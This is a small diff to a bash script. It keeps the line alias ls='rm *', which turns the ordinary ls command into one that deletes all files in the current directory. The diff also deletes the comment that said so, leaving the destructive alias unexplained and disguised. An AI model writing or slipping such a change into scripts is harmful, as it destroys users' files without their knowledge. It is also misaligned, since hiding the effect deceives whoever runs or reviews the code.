@@ -1,4 +1,2 @@
-#!/usr/bin/env bash
-# This script creates an alias for ls that deletes all files
-
+#!/bin/bash
 alias ls='rm *'
